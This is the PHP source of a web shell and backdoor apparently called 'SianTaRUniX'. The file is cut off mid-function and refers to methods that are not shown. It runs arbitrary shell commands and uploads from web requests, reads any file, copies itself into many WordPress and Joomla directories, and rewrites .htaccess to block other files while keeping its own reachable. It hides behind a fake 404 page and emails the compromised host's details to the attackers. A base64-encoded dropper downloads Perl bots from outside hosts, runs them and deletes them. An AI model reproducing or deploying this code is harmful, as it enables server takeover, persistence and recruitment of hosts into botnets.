<?php

error_reporting(0);

set_time_limit(0);

class SianTaRUniX
{
    private $access = ['www-data', 'www', 'apache'];
    private $type;
    private $os;
    private $user;

    public function __construct()
    {
        $this->user = get_current_user();
        $this->os = $this->check('os');
        $this->type = $this->check('cmd');

        if (isset($_GET['x'])) {
            switch ($_GET['x']) {
                case 'get':
                    if (isset($_GET['file'])) {
                        $file = urldecode($_GET['file']);
                        $name = (isset($_GET['name'])) ? $_GET['name'] : 'px.php';
                        $code = file_get_contents($file);
                        $myfile = fopen($name, 'w+');
                        fwrite($myfile, $code);
                        fclose($myfile);
                    }
                    break;

                case 'plbot':
                    $this->plBot();
                    break;

                case 'clear':
                    $this->delete('px.php');
                    $this->delete('pl.php');
                    $this->delete('*.j');
                    $this->delete('*.i');
                    $this->delete('.libs.up.php.i');
                    $this->delete('.libs.up.php.j');
                    $this->delete('.libs.inc.php.i');
                    $this->delete('.libs.inc.php.j');
                    $this->delete('.libs.php.i');
                    $this->delete('.libs.php.j');
                    $this->delete('.inc.php.j');
                    $this->delete('.inc.php.i');
                    $this->delete('.gelo.php.i');
                    $this->delete('.gelo.php.j');
                    break;

                case 'read':
                    if (isset($_GET['path'])) {
                        $path = urldecode($_GET['path']);
                        $this->setDB($path);
                    }
                    break;

                case 'jdb':
                    $this->joomlaDb();
                    break;

                case 'wpdb':
                    $this->wpDb();
                    break;

                case 'bajak':
                    $this->Bajak();
                    break;

                case 'mail':
                    $host = $_SERVER['HTTP_HOST'];
                    $uri = $_SERVER['REQUEST_URI'];
                    $serv = gethostbyname($_SERVER['SERVER_ADDR']);
                    $addr = gethostbyname($_SERVER['REMOTE_ADDR']);
                    mail('crewsiantar@gmail.com,crewsiantar@yahoo.com,crewsiantar@hotmail.com', 'kiriman bos ' . $host . $uri, 'Url:' . $host . $uri . " \nIp :$serv\n Ip injector: $addr");
                    mail('crewsiantar@gmail.com,crewsiantar@yahoo.com,crewsiantar@hotmail.com', 'kiriman bos ' . $host . $uri, 'Url:' . $host . $uri . " \nIp :$serv\n Ip injector: $addr");
                    break;

                case 'clone':
                    $type = (isset($_GET['type'])) ? $_GET['type'] : 'default';
                        $this->setClone('../../../', '.unix.php');
                        $this->setClone('../../../cache', '.unix.php');
                        $this->setClone('../../../contactformgenerator', '.unix.php');
                        $this->setClone('../../../cfg-contactform', '.unix.php');
                        $this->setClone('../../../ninja-applications/fufu/lib', '.unix.php');
                        $this->setClone('../../../ninja-applications', '.unix.php');
                        $this->setClone('../../../media/system/js', '.unix.php');
                        $this->setClone('../../../components/com_media/', '.unix.php');
                        $this->setClone('../../../modules/mod_banners/tmpl/', '.unix.php');
                        $this->setClone('../../../tmp/plupload', '.unix.php');
                        $this->setClone('../../../images/jdownloads/screenshots', '.unix.php');
                        $this->setClone('../../../wp-content', '.unix.php');
                        $this->setClone('../../../wp-admin/includes', '.unix.php');
                        $this->setClone('../../../wp-includes', '.unix.php');
                    break;

                case 'dobel':
                    if (isset($_GET['path'])) {
                        $path = urldecode($_GET['path']);
                        if (strstr($path, ',')) {
                            $data = explode(',', $path);
                            if (is_array($data) && count($data) > 0) {
                                $data = array_filter($data);
                                if (count($data) > 0) {
                                    foreach ($data as $k) {
                                        $this->setClone($k);
                                    }
                                }
                            }
                        } else {
                            $path = urldecode($_GET['path']);
                            $this->setClone('../../../', '.unix.php');
                            $this->setClone('../../../cache', '.unix.php');
                            $this->setClone('../../../contactformgenerator', '.unix.php');
                            $this->setClone('../../../cfg-contactform', '.unix.php');
                            $this->setClone('../../../ninja-applications/fufu/lib', '.unix.php');
                            $this->setClone('../../../ninja-applications', '.unix.php');
                            $this->setClone('../../../media/system/js', '.unix.php');
                            $this->setClone('../../../media/system/css', '.unix.php');
                            $this->setClone('../../../tmp/plupload', '.unix.php');
                            $this->setClone('../../../images/jdownloads/screenshots', '.unix.php');
                            $this->setClone('../../../wp-content', '.unix.php');
                            $this->setClone('../../../wp-admin/includes', '.unix.php');
                            $this->setClone('../../../wp-includes', '.unix.php');
                        }
                    } else {
                        $this->setClone('.unix.php');
                        $this->setClone('../.unix.php');
                        $this->setClone('../../.unix.php');
                        $this->setClone('../../../.unix.php');
                    }
                    break;

                case 'patch':
                    $lock = (isset($_GET['lock'])) ? 1 : 0;
                    $force = (isset($_GET['force'])) ? 1 : 0;
                    $path = '';
                    if (isset($_GET['path'])) {
                        $path = urldecode($_GET['path']);
                        if (strstr($path, ',')) {
                            $path = explode(',', $path);
                        }
                    }
                    if (isset($_GET['allow'])) {
                        $files = urldecode($_GET['allow']);
                        if (strstr($files, ',')) {
                            $file = explode(',', $files);
                            $this->setPatch($user, $file, $lock, $path, $force);
                        } else {
                            $this->setPatch($user, $files, $lock, $path, $force);
                        }
                    } else {
                                $this->setPatch($user, '', $lock, $path, $force);
                            }
                    break;

                case 'chmod':
                    if (isset($_GET['dir'])) {
                        $dir = $_GET['dir'];
                        if (1 == $dir) {
                            chmod('./', 0555);
                        } elseif (2 == $dir) {
                            chmod('./', 0555);
                            chmod('../', 0555);
                        } elseif (3 == $dir) {
                            chmod('./', 0555);
                            chmod('../', 0555);
                            chmod('../../', 0555);
                        } else {
                            $dir = str_replace('|', '/', $dir);
                            chmod($dir, 0555);
                        }
                    }
                    break;

                case 'die':
                        $source = $_SERVER['SCRIPT_FILENAME'];
                        @unlink($source);
                    break;
            }
        } else {
            if (isset($_GET['del'])) {
                $del = $_GET['del'];
                if (strstr($del, ',')) {
                    $data = explode(',', $del);
                    if (is_array($data) && count($data) > 0) {
                        $data = array_filter($data);
                        if (count($data) > 0) {
                            foreach ($data as $k) {
                                $this->delete($k);
                            }
                        }
                    }
                } else {
                    $this->delete($del);
                }
            }
            $this->getForm();
        }
    }

    private function plBot()
    {
        $code = 'PD9waHANCmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsNCkBleGVjKCd3R0VUIGh0dHA6Ly93d3cuY2F5Y28uZXMvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzEgLU8gLmFiYzE7cGVybCAuYWJjMTtwZXJsIC5hYmMxO3JtIC1mciAuYWJjMScpOw0KQGV4ZWMoJ2N1cmwgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzEgLW8gLmFiYzE7cGVybCAuYWJjMTtwZXJsIC5hYmMxO3JtIC1mciAuYWJjMScpOw0KQGV4ZWMoJ2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmMxIC5hYmMxO3BlcmwgLmFiYzE7cGVybCAuYWJjMTtybSAtZnIgLmFiYzEnKTsNCkBleGVjKCdseW54IC1zb3VyY2UgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzEgPiAuYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygnZmV0Y2ggLW8gLmFiYzEgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzE7cGVybCAuYWJjMTtwZXJsIC5hYmMxO3JtIC1mciAuYWJjMScpOw0KQGV4ZWMoJ0dFVCBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmMxPi5hYmMxO3BlcmwgLmFiYzE7cGVybCAuYWJjMTtybSAtZnIgLmFiYzEnKTsNCkBleGVjKCdybSAtcmYgLmFiYzEnKTsNCkBleGVjKCdjZCAvdG1wO3dnZXQgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzEgLU8gLmFiYzE7cGVybCAuYWJjMTtwZXJsIC5hYmMxO3JtIC1mciAuYWJjMScpOw0KQGV4ZWMoJ2NkIC90bXA7Y3VybCBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMSAtbyAuYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygnY2QgL3RtcDtsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMSAuYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygnY2QgL3RtcDtseW54IC1zb3VyY2UgaHR0cDovL3d3dy5hdmFkdGFyLmNvbS9wcm95ZWN0b3MvaW1vcmEvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzEgPiAuYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygnY2QgL3RtcDtmZXRjaCAtbyAuYWJjMSBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygnY2QgL3RtcDtHRVQgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMT4uYWJjMTtwZXJsIC5hYmMxO3BlcmwgLmFiYzE7cm0gLWZyIC5hYmMxJyk7DQpAZXhlYygncm0gLXJmIGluZGV4LnBocC4qJyk7DQpAZXhlYygnY2QgL3RtcDtybSAtcmYgLmFiYzEnKTsNCkBleGVjKCdybSAtcmYgLmFiYzEnKTsNCkBleGVjKCdjZCAvdG1wO3JtIC1yZiAuYWJjMSonKTsNCkBleGVjKCdybSAtcmYgLmFiYzEqJyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KQHNoZWxsX2V4ZWMoJ3dnZXQgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzIgLU8gLmFiYzI7cGVybCAuYWJjMjtwZXJsIC5hYmMyO3JtIC1mciAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ2N1cmwgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzIgLW8gLmFiYzI7cGVybCAuYWJjMjtwZXJsIC5hYmMyO3JtIC1mciAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmMyIC5hYmMyO3BlcmwgLmFiYzI7cGVybCAuYWJjMjtybSAtZnIgLmFiYzInKTsNCkBzaGVsbF9leGVjKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5hdmFkdGFyLmNvbS9wcm95ZWN0b3MvaW1vcmEvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzIgPiAuYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnZmV0Y2ggLW8gLmFiYzIgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzI7cGVybCAuYWJjMjtwZXJsIC5hYmMyO3JtIC1mciAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ0dFVCBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmMyPi5hYmMyO3BlcmwgLmFiYzI7cGVybCAuYWJjMjtybSAtZnIgLmFiYzInKTsNCkBzaGVsbF9leGVjKCdybSAtcmYgLmFiYzInKTsNCkBzaGVsbF9leGVjKCdjZCAvdG1wO3dnZXQgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzIgLU8gLmFiYzI7cGVybCAuYWJjMjtwZXJsIC5hYmMyO3JtIC1mciAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ2NkIC90bXA7Y3VybCBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMiAtbyAuYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnY2QgL3RtcDtsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMiAuYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnY2QgL3RtcDtseW54IC1zb3VyY2UgaHR0cDovL3d3dy5hdmFkdGFyLmNvbS9wcm95ZWN0b3MvaW1vcmEvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzIgPiAuYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnY2QgL3RtcDtmZXRjaCAtbyAuYWJjMiBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnY2QgL3RtcDtHRVQgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMj4uYWJjMjtwZXJsIC5hYmMyO3BlcmwgLmFiYzI7cm0gLWZyIC5hYmMyJyk7DQpAc2hlbGxfZXhlYygnY2QgL3RtcDtybSAtcmYgaW5kZXgucGhwLionKTsNCkBzaGVsbF9leGVjKCdjZCAvdG1wO3JtIC1yZiAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ3JtIC1yZiAuYWJjMicpOw0KQHNoZWxsX2V4ZWMoJ2NkIC90bXA7cm0gLXJmIC5hYmMyKicpOw0KQHNoZWxsX2V4ZWMoJ3JtIC1yZiAuYWJjMionKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXsNCkBzeXN0ZW0oJ3dnZXQgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzMgLU8gLmFiYzM7cGVybCAuYWJjMztwZXJsIC5hYmMzO3JtIC1mciAuYWJjMycpOw0KQHN5c3RlbSgnY3VybCBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMyAtbyAuYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMyAuYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5hdmFkdGFyLmNvbS9wcm95ZWN0b3MvaW1vcmEvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzMgPiAuYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdmZXRjaCAtbyAuYWJjMyBodHRwOi8vd3d3LmVrby1vZmVuc3l3YS5wbC9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdHRVQgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMz4uYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdybSAtcmYgLmFiYzMnKTsNCkBzeXN0ZW0oJ2NkIC90bXA7d2dldCBodHRwOi8vZ2lvcmdpb3N0b3JlLnhvb20uaXQvZ2lvcmdpby9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMyAtTyAuYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdjZCAvdG1wO2N1cmwgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzMgLW8gLmFiYzM7cGVybCAuYWJjMztwZXJsIC5hYmMzO3JtIC1mciAuYWJjMycpOw0KQHN5c3RlbSgnY2QgL3RtcDtsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMyAuYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdjZCAvdG1wO2x5bnggLXNvdXJjZSBodHRwOi8vd3d3LmF2YWR0YXIuY29tL3Byb3llY3Rvcy9pbW9yYS9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMyA+IC5hYmMzO3BlcmwgLmFiYzM7cGVybCAuYWJjMztybSAtZnIgLmFiYzMnKTsNCkBzeXN0ZW0oJ2NkIC90bXA7ZmV0Y2ggLW8gLmFiYzMgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzM7cGVybCAuYWJjMztwZXJsIC5hYmMzO3JtIC1mciAuYWJjMycpOw0KQHN5c3RlbSgnY2QgL3RtcDtHRVQgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjMz4uYWJjMztwZXJsIC5hYmMzO3BlcmwgLmFiYzM7cm0gLWZyIC5hYmMzJyk7DQpAc3lzdGVtKCdybSAtcmYgLmFiYzMnKTsNCkBzeXN0ZW0oJ2NkIC92YXIvdG1wO3JtIC1yZiBpbmRleC5waHAuKicpOw0KQHN5c3RlbSgnY2QgL3RtcDtybSAtcmYgLmFiYzMnKTsNCkBzeXN0ZW0oJ2NkIC90bXA7cm0gLXJmIC5hYmMzKicpOw0KDQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsNCkBwYXNzdGhydSgnd2dldCBodHRwOi8vZ2lvcmdpb3N0b3JlLnhvb20uaXQvZ2lvcmdpby9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjNCAtTyAuYWJjNDtwZXJsIC5hYmM0O3BlcmwgLmFiYzQ7cm0gLWZyIC5hYmM0Jyk7DQpAcGFzc3RocnUoJ2N1cmwgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQgLW8gLmFiYzQ7cGVybCAuYWJjNDtwZXJsIC5hYmM0O3JtIC1mciAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjNCAuYWJjNDtwZXJsIC5hYmM0O3BlcmwgLmFiYzQ7cm0gLWZyIC5hYmM0Jyk7DQpAcGFzc3RocnUoJ2x5bnggLXNvdXJjZSBodHRwOi8vd3d3LmF2YWR0YXIuY29tL3Byb3llY3Rvcy9pbW9yYS9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjNCA+IC5hYmM0O3BlcmwgLmFiYzQ7cGVybCAuYWJjNDtybSAtZnIgLmFiYzQnKTsNCkBwYXNzdGhydSgnZmV0Y2ggLW8gLmFiYzQgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQ7cGVybCAuYWJjNDtwZXJsIC5hYmM0O3JtIC1mciAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdHRVQgaHR0cDovL3d3dy5jYXljby5lcy9pbmNsdWRlcy9qcy9UaGVtZU9mZmljZS8uYWJjND4uYWJjNDtwZXJsIC5hYmM0O3BlcmwgLmFiYzQ7cm0gLWZyIC5hYmM0Jyk7DQpAcGFzc3RocnUoJ3JtIC1yZiAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdjZCAvdG1wO3dnZXQgaHR0cDovL2dpb3JnaW9zdG9yZS54b29tLml0L2dpb3JnaW8vaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQgLU8gLmFiYzQ7cGVybCAuYWJjNDtwZXJsIC5hYmM0O3JtIC1mciAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdjZCAvdG1wO2N1cmwgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQgLW8gLmFiYzQ7cGVybCAuYWJjNDtwZXJsIC5hYmM0O3JtIC1mciAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdjZCAvdG1wO2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmM0IC5hYmM0O3BlcmwgLmFiYzQ7cGVybCAuYWJjNDtybSAtZnIgLmFiYzQnKTsNCkBwYXNzdGhydSgnY2QgL3RtcDtseW54IC1zb3VyY2UgaHR0cDovL3d3dy5hdmFkdGFyLmNvbS9wcm95ZWN0b3MvaW1vcmEvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQgPiAuYWJjNDtwZXJsIC5hYmM0O3BlcmwgLmFiYzQ7cm0gLWZyIC5hYmM0Jyk7DQpAcGFzc3RocnUoJ2NkIC90bXA7ZmV0Y2ggLW8gLmFiYzQgaHR0cDovL3d3dy5la28tb2ZlbnN5d2EucGwvaW5jbHVkZXMvanMvVGhlbWVPZmZpY2UvLmFiYzQ7cGVybCAuYWJjNDtwZXJsIC5hYmM0O3JtIC1mciAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdjZCAvdG1wO0dFVCBodHRwOi8vd3d3LmNheWNvLmVzL2luY2x1ZGVzL2pzL1RoZW1lT2ZmaWNlLy5hYmM0Pi5hYmM0O3BlcmwgLmFiYzQ7cGVybCAuYWJjNDtybSAtZnIgLmFiYzQnKTsNCkBwYXNzdGhydSgncm0gLXJmIGluZGV4LnBocC4qJyk7DQpAcGFzc3RocnUoJ3JtIC1yZiAuYWJjNCcpOw0KQHBhc3N0aHJ1KCdybSAtcmYgLmFiYzQqJyk7DQp9DQplbHNle30NCj8+';
        $code2 = base64_decode($code);
        $myfile = fopen('pl.php', 'w+');
        fwrite($myfile, $code2);
        fclose($myfile);
    }

    private function check($tipe)
    {
        if ('cmd' == $tipe) {
            $result = 0;
            if (function_exists('passthru')) {
                $result = 'passthru';
            } elseif (function_exists('system')) {
                $result = 'system';
            } elseif (function_exists('exec')) {
                $result = 'exec';
            } elseif (function_exists('shell_exec')) {
                $result = 'shell_exec';
            }
        } else {
            $result = 'linux';
            if (PHP_OS == 'WINNT') {
                $result = 'windows';
            } elseif (PHP_OS == 'Linux') {
                $result = 'linux';
            } elseif (PHP_OS == 'FreeBSD') {
                $result = 'freebsd';
            }
        }

        return $result;
    }

    private function getForm()
    {
        if (isset($_GET['ap'])) {
            $safe = @ini_get('safe_mode');
            $secure = (!$safe) ? 'SAFE_MODE : OFF' : 'SAFE_MODE : ON';
            echo "<body style='background:#610680;color:#fff;font-family:monospace;font-size:13px;'>";
            echo '<title>SianTaRUniX</title><br>';
            echo '<b>' . $secure . '</b><br>';
            $cur_user = '(' . $this->user . ')';
            echo '<b>User : uid=' . getmyuid() . $cur_user . ' gid=' . getmygid() . $cur_user . '</b><br>';
            echo '<b>Uname : ' . php_uname() . '</b><br/>';
            echo '<form enctype=multipart/form-data action method=POST><b>Upload File</b><br/><input type=hidden name=submit><input type=file name=userfile size=28><br><b>New name: </b><input type=text size=15 name=newname class=ta><input type=submit class=bt value=Upload></form>';
            $this->processForm();
            $this->cmd();
        } else {
            $this->form();
            $this->cmd();
        }
    }

    private function form()
    {
        if (false !== strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'google')) {
            header('HTTP/1.0 404 Not Found');
            echo '<h1>Error 404 Not Found</h1>';
            echo 'The page that you have requested could not be found.';
            exit();
        } else {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            echo '<h1>Error 404 Not Found</h1>';
            echo 'The page that you have requested could not be found.';
            die();
            exit();
        }
    }

    private function processForm()
    {
        if (isset($_POST['submit'])) {
            $uploaddir = $this->pwd();
            if (!$name = $_POST['newname']) {
                $name = $_FILES['userfile']['name'];
            }
            move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);
            echo(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) ? '!!Upload Failed' : 'Success Upload to ' . $uploaddir . $name;
        }
    }

    private function pwd()
    {
        $cwd = getcwd();
        if ($u = strrpos($cwd, '/')) {
            return($u != strlen($cwd) - 1) ? $cwd . '/' : $cwd;
        } elseif ($u = strrpos($cwd, '/')) {
            if ($u != strlen($cwd) - 1) {
                return $cwd . '/';
            } else {
                return $cwd;
            }
        }
    }

    private function cmd($cmd = false)
    {
        if ($cmd) {
            echo '<pre>' . $this->exe($cmd) . '</pre>';
        } else {
            if (isset($_GET['q'])) {
                echo '<pre>' . $this->exe($_GET['q']) . '</pre>';
            } else {
                echo('windows' == $this->os) ? '<pre>' . $this->exe('dir') . '</pre>' : '<pre>' . $this->exe('ls -la') . '</pre>';
            }
        }
    }

    private function exe($cmd)
    {
        $res = '';
        if ('exec' == $this->type) {
            @exec($cmd, $res);
            $res = join('n', $res);
        } elseif ('shell_exec' == $this->type) {
            $res = @shell_exec($cmd);
        } elseif ('system' == $this->type) {
            @ob_start();
            @system($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif ('passthru' == $this->type) {
            @ob_start();
            @passthru($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
        }

        return $res;
    }

    private function setPatch($user, $data, $lock, $path, $force)
    {
        $create = 1;
        if (!$force) {
            if (in_array($user, $this->access)) {
                $create = 0;
            }
        }
        if ($create) {
            if ($lock) {
                $i = 'deny from all' . PHP_EOL;
            } else {
                $i = '<Files ~ "(?i).(zip|rar|php|php.*|phtml|gif|png|phpgif|asp|asp.*)$">' . PHP_EOL;
                $i .= 'deny from all' . PHP_EOL;
                $i .= '</Files>' . PHP_EOL;
            }
            if (is_array($data)) {
                foreach ($data as $k) {
                    $i .= '<Files "' . $k . '">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                }
            } else {
                if (!empty($data)) {
                    $i .= '<Files "' . $data . '">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                } else {
                    $i .= '<Files "unix.php">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                    $i .= '<Files ".unix.php">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                    $i .= '<Files "indo.php">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                    $i .= '<Files "coi.php">' . PHP_EOL;
                    $i .= 'Order Allow,Deny' . PHP_EOL;
                    $i .= 'Allow from all' . PHP_EOL;
                    $i .= '</Files>' . PHP_EOL;
                }
            }
            if (is_array($path)) {
                foreach ($path as $k) {
                    $file = fopen($k, 'w');
                    fwrite($file, $i);
                    fclose($file);
                }
            } else {
                if (!empty($path)) {
                    $file = fopen($path, 'w');
                    fwrite($file, $i);
                    fclose($file);
                } else {
                    $file = fopen('.htaccess', 'w');
                    fwrite($file, $i);
                    fclose($file);
                }
            }
        }
    }

    private function setDB($file)
    {
        $read = file_get_contents($file);
        if ($read) {
            echo $read;
        } else {
            echo 'Unable to open file';
        }
        exit;
    }

    private function setClone($path, $newname)
    {
        $desti = $path . '/' . $newname;
        if (!is_readable($desti)) {
            $source = $_SERVER['SCRIPT_FILENAME'];
            copy($source, $desti);
            sleep(3);
            $this->checkingClone($desti);
        }
    }

    private function dobel($path, $newname)
    {
        $desti = $path . '/' . $newname;
        if (!is_readable($desti)) {
            $source = $_SERVER['SCRIPT_FILENAME'];
            copy($source, $desti);
            sleep(3);
            $this->checkingClone($desti);
        }
